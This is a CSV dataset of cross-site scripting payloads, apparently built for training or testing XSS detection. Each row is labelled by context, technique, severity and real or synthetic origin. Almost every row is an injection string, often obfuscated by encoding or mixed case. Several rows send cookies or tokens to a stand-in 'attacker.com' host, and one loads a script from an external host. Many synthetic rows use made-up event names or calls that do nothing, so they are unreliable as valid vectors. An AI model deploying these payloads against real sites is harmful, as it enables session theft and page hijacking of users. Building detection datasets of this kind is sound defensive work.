payload,context,technique,severity,length,source
"<viDeo srC=x onPasTe=AleRt(StrIng.frOmCHarCodE(88,83,83))>",tag_injection,synthetic,high,58,synthetic
<img id=x tabindex=1 onbeforedeactivate=alert(1)></img><input autofocus>,tag_injection,none,medium,72,real
'><img src=x onb&#101;for&#101;p&#97;st&#101;=&#97;l&#101;rt(1)>,attribute_escape,synthetic,low,64,synthetic
"""%3E%3Canimate onpageshow=console.log('XSS')%3E",tag_injection,synthetic,medium,47,synthetic
"<a href=""javas\x08cript:javascript:alert(5377)"" id=""fuzzelement1"">test</a>",js_uri,none,medium,74,real
"%3C!--%3E%3Cform onwebkitfullscreenchange=console.log(String.fromCharCode(88,83,83))%3E",tag_injection,synthetic,high,87,synthetic
\' onpagereveal=confirm(document.domain)//,attribute_escape,synthetic,medium,42,synthetic
<blink onk&#101;ypr&#101;ss=prompt(docum&#101;nt.dom&#97;in)/>,tag_injection,synthetic,medium,62,synthetic
"""><img src=x oncontextmenu=alert(document.domain)>",attribute_escape,synthetic,medium,50,synthetic
"<shadow onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</shadow>",tag_injection,none,medium,68,real
""" ontouchmove=prompt(1) """,attribute_escape,synthetic,medium,25,synthetic
"<object draggable=""true"" ondragend=""alert(1)"" style=display:block>AnonKryptiQuz</object>",tag_injection,none,medium,88,real
"element.setAttribute(%22onclick%22,%22prompt(String.fromCharCode(88,83,83))%22)",dom_sink,synthetic,high,79,synthetic
"""><script+src=""https://adserver.adtechus.com/pubapi/3.0/9857.1/3792195/0/170/ADTECH;noperf=1;cmd=bid;bidfloor=0.12;callback=confirm(1);//window.proper_d31c1edc_57a8d6de_38""></script>",dom_sink,none,medium,182,real
<xss id=x tabindex=1 onactivate=alert(1)></xss>,tag_injection,none,medium,47,real
"<style>:target {color: red;}</style><header id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></header>",tag_injection,none,medium,115,real
""" oNvoLumEchAngE=aLerT(STriNg.FroMChArCOde(88,83,83)) """,attribute_escape,synthetic,high,55,synthetic
%3Cscript%3Econfirm(document.domain)%3C/script%3E,script_injection,synthetic,medium,49,synthetic
"__proto__[""ongesturestart""]=alert(localStorage.getItem('token'))",dom_sink,synthetic,high,64,synthetic
"\"" oncut=consol&#101;.log(1)//",attribute_escape,synthetic,low,30,synthetic
<plaintext	onrepeat=prompt('XSS')>,tag_injection,synthetic,medium,34,synthetic
"<thead onmouseout=""alert(1)"" style=display:block>AnonKryptiQuz</thead>",tag_injection,none,medium,70,real
"'><img src=x ondblclick=\u0061lert(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,66,synthetic
"<marquee onbeforetoggle=\u0061lert(String.fromCharCode(88,83,83))/>",tag_injection,synthetic,high,67,synthetic
"<image2 onkeydown=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</image2>",tag_injection,none,medium,87,real
""" ><svG oNmoUseWheEl=ProMpt(doCumEnt.doMaiN)>",attribute_escape,synthetic,medium,45,synthetic
onpointermove=console.log/***/(1),event_handler,synthetic,low,33,synthetic
"onmozfullscr&#101;&#101;nch&#97;ng&#101;=prompt(String.fromCh&#97;rCod&#101;(88,83,83))",event_handler,synthetic,medium,87,synthetic
<maTh Src=x OnmOusEup=coNsoLe.Log(doCumEnt.doMaiN)>,tag_injection,synthetic,medium,51,synthetic
'><Img srC=x onSecUriTypOliCyvIolAtiOn=ConSolE.lOg(DocUmeNt.DomAin)>,attribute_escape,synthetic,medium,68,synthetic
&#106;AvaScrIpt:prOmpT(dOcuMenT.dOmaIn),js_uri,synthetic,medium,39,synthetic
"""><img src=x oncopy=prompt(document.domain)>",attribute_escape,synthetic,medium,44,synthetic
"<style>:target {color: red;}</style><audio id=x style=""transition:color 10s"" ontransitioncancel=print()></audio>",tag_injection,none,low,112,real
%22><title onclick=confirm(%27XSS%27)>,tag_injection,synthetic,medium,38,synthetic
"`><img src=x onch&#97;ng&#101;=confirm(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape,synthetic,medium,79,synthetic
${{AleRt(1)}},template_injection,synthetic,medium,13,synthetic
%22><img src=x onplay=confirm(1)>,attribute_escape,synthetic,medium,33,synthetic
"'><img src=x onanimationend=alert(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,65,synthetic
' onc&#97;npl&#97;y=prompt(docum&#101;nt.dom&#97;in) ',attribute_escape,synthetic,medium,54,synthetic
""" ontransitionend=prompt(location.hash) """,attribute_escape,synthetic,medium,41,synthetic
document.querySelector(%22body%22).innerHTML+=%22fetch(document.domain)%22,dom_sink,synthetic,high,74,synthetic
"<bdi onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</bdi>",tag_injection,none,medium,65,real
"docum&#101;nt.qu&#101;ryS&#101;l&#101;ctor(""body"").inn&#101;rHTML+=""consol&#101;.log(loc&#97;lStor&#97;g&#101;.g&#101;tIt&#101;m('tok&#101;n'))""",dom_sink,synthetic,low,144,synthetic
<svg><rtc onload=alert(1)></rtc>,tag_injection,none,medium,32,real
"element.insertAdjacentHTML(""beforeend"",""%3Cimg src=x onerror=prompt(document.domain)%3E"")",dom_sink,synthetic,medium,89,synthetic
"""><t&#101;xt&#97;r&#101;&#97; onscroll&#101;nd=&#97;l&#101;rt('XSS')>",tag_injection,synthetic,low,69,synthetic
"__proto__[""onmozfullscr&#101;&#101;nch&#97;ng&#101;""]=&#97;l&#101;rt('//&#97;tt&#97;ck&#101;r.com/?c='+docum&#101;nt.cooki&#101;)",dom_sink,synthetic,low,129,synthetic
<svg%0Aonload=%09((pro\u006dpt))()//,tag_injection,unicode_escape|url_encoding,low,36,real
<tr/onanimationend=prompt(%27XSS%27)>,tag_injection,synthetic,medium,37,synthetic
<spAn Src=x OnsEcuRitYpoLicYviOlaTioN=aLerT(lOcaTioN.hAsh)>,tag_injection,synthetic,medium,59,synthetic
<video onpointerdown=alert(1) style=display:block>AnonKryptiQuz</video>,tag_injection,none,medium,71,real
"<hgroup draggable=""true"" ondrag=""alert(1)"" style=display:block>AnonKryptiQuz</hgroup>",tag_injection,none,medium,85,real
 onKeyDowN=aLerT('XSS'),event_handler,synthetic,medium,23,synthetic
<!--><ForM oNpaGerEveAl=ConSolE.lOg(LocAtiOn.HasH)>,tag_injection,synthetic,medium,51,synthetic
' ><svg onbegin=confirm(1)>,attribute_escape,synthetic,medium,27,synthetic
&quot; onpointerdown=\u0061lert(document.domain) x=&quot;,attribute_escape,synthetic,low,57,synthetic
"docum&#101;nt.qu&#101;ryS&#101;l&#101;ctor(""body"").inn&#101;rHTML+=""prompt(bto&#97;(docum&#101;nt.cooki&#101;))""",dom_sink,synthetic,medium,112,synthetic
"__proto__[""onk&#101;yup""]=consol&#101;.log(bto&#97;(docum&#101;nt.cooki&#101;))",dom_sink,synthetic,low,79,synthetic
onsubmit=prompt&#40;document.domain&#41;,event_handler,synthetic,low,40,synthetic
"<select draggable=""true"" ondragend=""alert(1)"" style=display:block>AnonKryptiQuz</select>",tag_injection,none,medium,88,real
"""><img src=x onended=alert(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,58,synthetic
{{constructor[%27constructor%27](%27alert(%27XSS%27)%27)()}},template_injection,synthetic,medium,60,synthetic
<xsS	oNenD=pRomPt('XSS')>,tag_injection,synthetic,medium,25,synthetic
"eval(""confirm('//attacker.com/?c='+document.cookie)"")",dom_sink,synthetic,high,53,synthetic
" oninput=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))",event_handler,synthetic,low,63,synthetic
"&#101;l&#101;m&#101;nt.s&#101;tAttribut&#101;(""onclick"",""confirm(1)"")",dom_sink,synthetic,medium,69,synthetic
"docum&#101;nt.body.inn&#101;rHTML=""<img src=x on&#101;rror=f&#101;tch(n&#97;vig&#97;tor.s&#101;ndB&#101;&#97;con('//&#97;tt&#97;ck&#101;r.com',docum&#101;nt.cooki&#101;))>""",dom_sink,synthetic,low,172,synthetic
%3Cxss onkeypress=console.log(1)/%3E,tag_injection,synthetic,medium,36,synthetic
"""><img src=x onmous&#101;&#101;nt&#101;r=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>",attribute_escape,synthetic,low,79,synthetic
"<style>:target {color:red;}</style><rtc id=x style=""transition:color 1s"" ontransitionend=alert(1)></rtc>",tag_injection,none,medium,104,real
 ongotpointercapture=prompt(location.hash),event_handler,synthetic,medium,42,synthetic
<scRipT>//alErt(doCumEnt.doMaiN)</scRipT>,script_injection,synthetic,medium,41,synthetic
""" oninput=alert(1) """,attribute_escape,synthetic,medium,20,synthetic
`%3E%3Cimg src=x onpagereveal=console.log(document.domain)%3E,attribute_escape,synthetic,medium,61,synthetic
\' onpointermove=prompt(location.hash)//,attribute_escape,synthetic,medium,40,synthetic
"__proto__[""ondrop""]=eval(navigator.sendBeacon('//attacker.com',document.cookie))",dom_sink,synthetic,high,80,synthetic
"' ><svg onclos&#101;=prompt(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape,synthetic,medium,68,synthetic
\%22 oncopy=confirm(%27XSS%27)//,attribute_escape,synthetic,medium,32,synthetic
\' OnpOpsTatE=cOnfIrm(doCumEnt.doMaiN)//,attribute_escape,synthetic,medium,40,synthetic
<set onafterscriptexecute=alert(1)><script>1</script>,script_injection,none,medium,53,real
"<math href=""javascript:javascript:alert(3956)"">CLICKME</math>  <math> <maction actiontype=""statusline#http://google.com"" xlink:href=""javascript:javascript:alert(3956)"">CLICKME</maction> </math>",js_uri,none,medium,193,real
"<svg:circle cx=""0.45"" cy=""0.7"" r=""0.075"" fill=""white""/>",attribute_escape,none,low,55,real
JavAscRipT:aLerT/**/(DocUmeNt.DomAin),js_uri,synthetic,low,37,synthetic
<liStiNg X=y onKeyUp=AleRt(LocAtiOn.HasH)>,tag_injection,synthetic,medium,42,synthetic
"\"" onblur=\u0061lert(document.domain)//",attribute_escape,synthetic,low,39,synthetic
"%22 ><svg onpause=console.log(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,61,synthetic
'><img src=x onend=alert('XSS')>,attribute_escape,synthetic,medium,32,synthetic
"<!--><iframe ontouchstart=prompt(String.fromCharCode(88,83,83))>",tag_injection,synthetic,high,64,synthetic
<element onpointerrawupdate=alert(1) style=display:block>AnonKryptiQuz</element>,tag_injection,none,medium,80,real
j&#97;v&#97;	script:prompt(loc&#97;tion.h&#97;sh),js_uri,synthetic,medium,49,synthetic
<tr	ons&#101;l&#101;ct=consol&#101;.log(1)>,tag_injection,synthetic,low,43,synthetic
%27><img src=x onbeforetoggle=alert(location.hash)>,attribute_escape,synthetic,medium,51,synthetic
"<style>:target {color:red;}</style><multicol id=x style=""transition:color 1s"" ontransitionstart=alert(1)></multicol>",tag_injection,none,medium,116,real
"' ><svg onclos&#101;=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape,synthetic,low,78,synthetic
' %3E%3Csvg onselect=prompt(1)%3E,attribute_escape,synthetic,medium,33,synthetic
__${prOmpT(1)}__::.x,template_injection,synthetic,medium,20,synthetic
"__proto__[""on&#101;nd&#101;d""]=consol&#101;.log('XSS')",dom_sink,synthetic,low,54,synthetic
<listing/onwebkitanimationend=console.log(%27XSS%27)>,tag_injection,synthetic,medium,53,synthetic
"""==prompt(9)==""",attribute_escape,none,medium,15,real
"<optgroup draggable=""true"" ondragstart=""alert(1)"" style=display:block>AnonKryptiQuz</optgroup>",tag_injection,none,medium,94,real
%3Cmeta x=y onsecuritypolicyviolation=prompt('XSS')%3E,tag_injection,synthetic,medium,54,synthetic
%22><img src=x ongotpointercapture=alert(document.domain)>,attribute_escape,synthetic,medium,58,synthetic
oncut=javascript:alert(document.domain),event_handler,synthetic,medium,39,synthetic
"`%3E%3Cimg src=x onvolumechange=alert(String.fromCharCode(88,83,83))%3E",attribute_escape,synthetic,high,71,synthetic
	onCut=alErt(1),event_handler,synthetic,medium,15,synthetic
"<output oncontextmenu=""alert(1)"" style=display:block>AnonKryptiQuz</output>",tag_injection,none,medium,75,real
'%3E%3Cimg src=x onmouseover=prompt(1)%3E,attribute_escape,synthetic,medium,41,synthetic
"<figure onmouseout=""alert(1)"" style=display:block>AnonKryptiQuz</figure>",tag_injection,none,medium,72,real
%27 onblur=prompt(%27XSS%27) %27,attribute_escape,synthetic,medium,32,synthetic
""" %3E%3Csvg onanimationiteration=console.log(1)%3E",attribute_escape,synthetic,medium,50,synthetic
"__pRotO__[""oNclOse""]=ProMpt(doCumEnt.coOkiE)",dom_sink,synthetic,high,44,synthetic
'%27%3E%27%22%3E%3Cscript%3Ealert(2);%3C/script%3E',attribute_escape,url_encoding,medium,51,real
"<dd onmousemove=""alert(1)"">AnonKryptiQuz</dd>",tag_injection,none,medium,45,real
""" %3E%3Csvg onended=alert('XSS')%3E",attribute_escape,synthetic,medium,35,synthetic
{{{prompt(docum&#101;nt.dom&#97;in)}}},template_injection,synthetic,medium,38,synthetic
%22><img src=x onmousewheel=alert(1)>,attribute_escape,synthetic,medium,37,synthetic
<s&#101;l&#101;ct ons&#101;curitypolicyviol&#97;tion=confirm(loc&#97;tion.h&#97;sh)>,tag_injection,synthetic,medium,84,synthetic
"<html ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>AnonKryptiQuz</html>",tag_injection,none,medium,89,real
<figure id=x tabindex=1 onbeforedeactivate=alert(1)></figure><input autofocus>,tag_injection,none,medium,78,real
%22 ontouchmove=alert(location.hash) %22,attribute_escape,synthetic,medium,40,synthetic
\%22 onfocusin=prompt(1)//,attribute_escape,synthetic,medium,26,synthetic
<template	ondragenter=\u0061lert('XSS')>,tag_injection,synthetic,low,40,synthetic
"<tr
ontouchstart=confirm(location.hash)>",tag_injection,synthetic,medium,40,synthetic
"OnpAgeRevEal=alErt&#40;STriNg.FroMChArCOde(88,83,83)&#41;",event_handler,synthetic,high,57,synthetic
"&#101;l&#101;m&#101;nt.s&#101;tAttribut&#101;(""onclick"",""prompt(loc&#97;tion.h&#97;sh)"")",dom_sink,synthetic,medium,88,synthetic
'%3E%3Cimg src=x onbeforepaste=console.log('XSS')%3E,attribute_escape,synthetic,medium,52,synthetic
<form/onw&#97;iting=confirm(1)>,tag_injection,synthetic,medium,31,synthetic
"document.write(""<img src=x onerror=confirm(document.cookie)>"")",dom_sink,synthetic,high,62,synthetic
__proto__[%22onanimationend%22]=console.log(document.cookie),dom_sink,synthetic,high,60,synthetic
{{cOnsTruCtoR['ConStrUctOr']('ConFirM('XSS')')()}},template_injection,synthetic,medium,50,synthetic
'%3E%3Cimg src=x ongesturestart=alert(location.hash)%3E,attribute_escape,synthetic,medium,55,synthetic
"__proto__[""onhashchange""]=eval(localStorage.getItem('token'))",dom_sink,synthetic,high,61,synthetic
<imAge/onEnd=prOmpT(1)>,tag_injection,synthetic,medium,23,synthetic
<img2 onpointerenter=alert(1) style=display:block>AnonKryptiQuz</img2>,tag_injection,none,medium,70,real
"(neW FUncTioN(""ProMpt(StRinG.fRomChaRCoDe(88,83,83))""))();",dom_sink,synthetic,high,58,synthetic
%22 ongesturestart=alert(location.hash) %22,attribute_escape,synthetic,medium,43,synthetic
"document.querySelector(""body"").innerHTML+=""XMLHttpRequest(document.cookie+'&loc='+location.href)""",dom_sink,synthetic,high,97,synthetic
"<menu onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</menu>",tag_injection,none,medium,64,real
`%3E%3Cimg src=x onmouseover=prompt(document.domain)%3E,attribute_escape,synthetic,medium,55,synthetic
__proto__[%22onpageswap%22]=prompt(document.cookie+%27&loc=%27+location.href),dom_sink,synthetic,high,77,synthetic
<tr onselect=console.log(1)>,tag_injection,synthetic,medium,28,synthetic
<svg><script>123<1>alert(123)</script>,script_injection,none,medium,38,real
"<sub onkeydown=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</sub>",tag_injection,none,medium,81,real
<maTh OnmOusEup=coNsoLe.Log(doCumEnt.doMaiN)/>,tag_injection,synthetic,medium,46,synthetic
<b onpointerleave=alert(1) style=display:block>AnonKryptiQuz</b>,tag_injection,none,medium,64,real
JAVASCRIPT:consol&#101;.log(loc&#97;tion.h&#97;sh),js_uri,synthetic,low,50,synthetic
&quot; onbeforepaste=prompt(1) x=&quot;,attribute_escape,synthetic,medium,39,synthetic
ondrop=prompt&#40;location.hash&#41;,event_handler,synthetic,low,36,synthetic
"<?='<SCRIPT>alert(""XSS"")</SCRIPT>'?>",script_injection,case_variation,medium,36,real
<marquee onstart='javascript:alert&#x28;1&#x29;'>^__^,js_uri,html_entity,low,53,real
<scr	ipt>Function('confirm(1)')();</scr	ipt>,script_injection,synthetic,medium,44,synthetic
"document.write(""%3Cimg src=x onerror=alert('//attacker.com/?c='+document.cookie)%3E"")",dom_sink,synthetic,high,85,synthetic
%27><img src=x onpagehide=console.log(document.domain)>,attribute_escape,synthetic,medium,55,synthetic
'><Img srC=x onAniMatIonIteRatIon=coNsoLe.Log('XSS')>,attribute_escape,synthetic,medium,53,synthetic
<caption onafterscriptexecute=alert(1)><script>1</script>,script_injection,none,medium,57,real
"Obj&#101;ct.&#97;ssign(window,{""ons&#101;&#97;rch"":f&#101;tch})",dom_sink,synthetic,low,63,synthetic
"<style>@keyframes slidein {}</style><pre style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></pre>",tag_injection,none,medium,166,real
"<kbd onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</kbd>",tag_injection,none,medium,62,real
"<div draggable=""true"" contenteditable>drag me</div><tr ondrop=alert(1) contenteditable>drop here</tr>",tag_injection,none,medium,101,real
"${{'&#97;l&#101;rt(1)'.r&#101;pl&#97;c&#101;('&#97;l&#101;rt(1)','')}}",template_injection,synthetic,low,70,synthetic
"<video autoplay controls onpause=alert(1)><source src=""validvideo.mp4"" type=""video/mp4""></video>",tag_injection,none,medium,96,real
""" ><svG oNwaItiNg=ProMpt(StRinG.fRomChaRCoDe(88,83,83))>",attribute_escape,synthetic,high,56,synthetic
'%3E%3Cimg src=x onpopstate=alert('XSS')%3E,attribute_escape,synthetic,medium,43,synthetic
""" ><svg ontransitionend=alert(1)>",attribute_escape,synthetic,medium,33,synthetic
'><img src=x ongotpoint&#101;rc&#97;ptur&#101;=consol&#101;.log(docum&#101;nt.dom&#97;in)>,attribute_escape,synthetic,low,90,synthetic
%27 ><svg onsearch=prompt(document.domain)>,attribute_escape,synthetic,medium,43,synthetic
"\' OnmOusEenTer=coNfiRm(StrIng.frOmCHarCodE(88,83,83))//",attribute_escape,synthetic,high,56,synthetic
"Obj&#101;ct.&#97;ssign(window,{""on&#97;nim&#97;tionst&#97;rt"":XMLHttpR&#101;qu&#101;st})",dom_sink,synthetic,high,88,synthetic
""" ><svg ondragstart=console.log(location.hash)>",attribute_escape,synthetic,medium,47,synthetic
"<m&#101;t&#97; onh&#97;shch&#97;ng&#101;=confirm(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection,synthetic,medium,89,synthetic
<taBle/onSelEct=coNfiRm(DocUmeNt.DomAin)>,tag_injection,synthetic,medium,41,synthetic
"setInterval(%22eval(localStorage.getItem(%27token%27))%22,100)",dom_sink,synthetic,high,62,synthetic
"<rtc onkeydown=""alert(1)"" contenteditable>AnonKryptiQuz</rtc>",tag_injection,none,medium,61,real
	onInvAliD=pRomPt(1),event_handler,synthetic,medium,20,synthetic
<anImaTetRanSfoRm OncOntExtMenU=pRomPt(DocUmeNt.DomAin)/>,tag_injection,synthetic,medium,57,synthetic
<h1 onpointermove=alert(1) style=display:block>AnonKryptiQuz</h1>,tag_injection,none,medium,65,real
<!--><table onselect=prompt(1)>,tag_injection,synthetic,medium,31,synthetic
<address onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</address><input value=clickme>,tag_injection,none,medium,114,real
'%3E%3Cimg src=x onpause=confirm(document.domain)%3E,attribute_escape,synthetic,medium,52,synthetic
"""><img src=x onfocusout=console.log(location.hash)>",attribute_escape,synthetic,medium,51,synthetic
'><img src=x onpopstate=alert(document.domain)>,attribute_escape,synthetic,medium,47,synthetic
' onfullscr&#101;&#101;nch&#97;ng&#101;=&#97;l&#101;rt(loc&#97;tion.h&#97;sh) ',attribute_escape,synthetic,low,79,synthetic
'><img src=x onpopst&#97;t&#101;=prompt(1)>,attribute_escape,synthetic,medium,43,synthetic
"""><img src=x on&#101;nd=prompt(loc&#97;tion.h&#97;sh)>",attribute_escape,synthetic,medium,54,synthetic
"""`'><script>\x3Bjavascript:alert(1)</script>",script_injection,none,medium,44,real
<viDeo onCliCk=ConSolE.lOg('XSS') onCliCk=ConSolE.lOg('XSS')>,tag_injection,synthetic,medium,61,synthetic
`><img src=x onerror=\u0061lert(1)>,attribute_escape,synthetic,low,35,synthetic
"%3Cxmp src=x onmousewheel=prompt(String.fromCharCode(88,83,83))%3E",tag_injection,synthetic,high,66,synthetic
"<style>@keyframes slidein {}</style><track style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></track>",tag_injection,none,medium,164,real
' onplaying=alert(location.hash) ',attribute_escape,synthetic,medium,34,synthetic
%22 ><svg onsecuritypolicyviolation=console.log(%27XSS%27)>,attribute_escape,synthetic,medium,59,synthetic
"<br onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</br>",tag_injection,none,medium,65,real
""" ><svg onmous&#101;wh&#101;&#101;l=prompt(docum&#101;nt.dom&#97;in)>",attribute_escape,synthetic,medium,69,synthetic
"<style>:target {color:red;}</style><kbd id=x style=""transition:color 1s"" ontransitionstart=alert(1)></kbd>",tag_injection,none,medium,106,real
%22 ><svg ontouchmove=confirm(%27XSS%27)>,attribute_escape,synthetic,medium,41,synthetic
"<div style=""content: url(javascript:alert('AnonKryptiQuz'));"">",js_uri,none,medium,62,real
<button ondragenter=alert(location.hash)>,tag_injection,synthetic,medium,41,synthetic
"<acronym onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>AnonKryptiQuz</span></acronym>",tag_injection,none,medium,287,real
"element.insertAdjacentHTML(""beforeend"",""%3Cimg src=x onerror=fetch(document.domain)%3E"")",dom_sink,synthetic,high,88,synthetic
<script>/x/\u0061lert(document.domain)</script>,script_injection,synthetic,low,47,synthetic
\' onmousedown=alert(location.hash)//,attribute_escape,synthetic,medium,37,synthetic
"'%3E%3Cimg src=x onpageswap=console.log(String.fromCharCode(88,83,83))%3E",attribute_escape,synthetic,high,73,synthetic
<scr&#x9ipt>alert('XSS')</scr&#x9ipt>,generic,html_entity,medium,37,real
"&#101;v&#97;l(""consol&#101;.log(bto&#97;(docum&#101;nt.cooki&#101;))"")",dom_sink,synthetic,low,70,synthetic
" onPauSe=ConSolE.lOg(StrIng.frOmCHarCodE(88,83,83))",event_handler,synthetic,high,51,synthetic
' ontouch&#101;nd=consol&#101;.log('XSS') ',attribute_escape,synthetic,low,43,synthetic
onpause=prompt/*x*/(location.hash),event_handler,synthetic,low,34,synthetic
"<q onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</q>",tag_injection,none,medium,61,real
"""%3E%3Cimg src=x onkeypress=alert(1)%3E",attribute_escape,synthetic,medium,39,synthetic
"%27 onanimationstart=alert(String.fromCharCode(88,83,83)) %27",attribute_escape,synthetic,high,61,synthetic
"__proto__[""onpageswap""]=\u0061lert(btoa(document.cookie))",dom_sink,synthetic,high,57,synthetic
"'%3E%3Cimg src=x ontouchend=prompt(String.fromCharCode(88,83,83))%3E",attribute_escape,synthetic,high,68,synthetic
"<style>@keyframes slidein {}</style><th style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></th>",tag_injection,none,medium,158,real
'><img src=x onmouseover=console.log('XSS')>,attribute_escape,synthetic,medium,44,synthetic
%3Cobject/onbeforepaste=confirm(document.domain)%3E,tag_injection,synthetic,medium,51,synthetic
"Obj&#101;ct.&#97;ssign(window,{""on&#97;nim&#97;tionit&#101;r&#97;tion"":f&#101;tch})",dom_sink,synthetic,low,83,synthetic
<noscript onfocusout=alert(1) tabindex=1 id=x></noscript><input autofocus>,tag_injection,none,medium,74,real
"<del onmouseenter=""alert(1)"" style=display:block>AnonKryptiQuz</del>",tag_injection,none,medium,68,real
<html ontouchstart=alert(1)>,tag_injection,none,medium,28,real
"' ><svg ontransitionrun=alert(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,61,synthetic
<svg><ul onload=alert(1)></ul>,tag_injection,none,medium,30,real
""" oNenD=aLerT('XSS') """,attribute_escape,synthetic,medium,22,synthetic
<table ontouchend=prompt(document.domain)>,tag_injection,synthetic,medium,42,synthetic
<s onpointerdown=alert(1) style=display:block>AnonKryptiQuz</s>,tag_injection,none,medium,63,real
<noscript onblur=alert(1) tabindex=1 id=x></noscript><input autofocus>,tag_injection,none,medium,70,real
"' on&#101;nd=confirm(String.fromCh&#97;rCod&#101;(88,83,83)) '",attribute_escape,synthetic,medium,62,synthetic
`><img src=x onpopstate=alert(document.domain)>,attribute_escape,synthetic,medium,47,synthetic
' %3E%3Csvg onplay=confirm('XSS')%3E,attribute_escape,synthetic,medium,36,synthetic
"<spacer oncontextmenu=""alert(1)"" style=display:block>AnonKryptiQuz</spacer>",tag_injection,none,medium,75,real
"<canvas onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</canvas>",tag_injection,none,medium,85,real
"<META HTTP-EQUIV=""refresh"" CONTENT=""0;url=javascript:javascript:alert(5812);"">",js_uri,case_variation,medium,78,real
"'><Img srC=x onGotPoiNteRcaPtuRe=ConFirM(STriNg.FroMChArCOde(88,83,83))>",attribute_escape,synthetic,high,72,synthetic
<!--><script src=//14.rs>,script_injection,none,low,25,real
 onLoaD=cOnfIrm(loCatIon.haSh),event_handler,synthetic,medium,30,synthetic
"""><img src=x ontransitionend=confirm('XSS')>",attribute_escape,synthetic,medium,44,synthetic
j&#97;vascript:console.log(document.domain),js_uri,synthetic,medium,43,synthetic
"<abbr onmouseout=""alert(1)"" style=display:block>AnonKryptiQuz</abbr>",tag_injection,none,medium,68,real
‘ onfocus=’alert(1)’,event_handler,none,medium,20,real
"<style>:target {transform: rotate(180deg);}</style><hr id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></hr>",tag_injection,none,medium,122,real
"OnaUxcLicK=pRomPt&#40;StRinG.fRomChaRCoDe(88,83,83)&#41;",event_handler,synthetic,high,56,synthetic
""" ><svg onsearch=prompt(location.hash)>",attribute_escape,synthetic,medium,39,synthetic
 onchange=\u0061lert(document.domain),event_handler,synthetic,low,37,synthetic
"<div draggable=""true"" contenteditable>drag me</div><rt ondrop=alert(1) contenteditable>drop here</rt>",tag_injection,none,medium,101,real
"location.href=""javascr	ipt:eval(document.cookie+'&loc='+location.href)""",dom_sink,synthetic,high,71,synthetic
ontouchmove=prompt&#40;document.domain&#41;,event_handler,synthetic,low,43,synthetic
<!--><body onclose=console.log('XSS')>,tag_injection,synthetic,medium,38,synthetic
<body onpointermove=alert(location.hash) onpointermove=alert(location.hash)>,tag_injection,synthetic,medium,76,synthetic
"document.body.innerHTML=""<img src=x onerror=eval('XSS')>""",dom_sink,synthetic,high,57,synthetic
<hr id=x tabindex=1 onfocus=alert(1)></hr>,tag_injection,none,medium,42,real
"<style>@keyframes slidein {}</style><listing style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></listing>",tag_injection,none,medium,168,real
ondragover=prompt(%27XSS%27),event_handler,synthetic,medium,28,synthetic
""" ><svg onp&#97;us&#101;=confirm('XSS')>",attribute_escape,synthetic,medium,40,synthetic
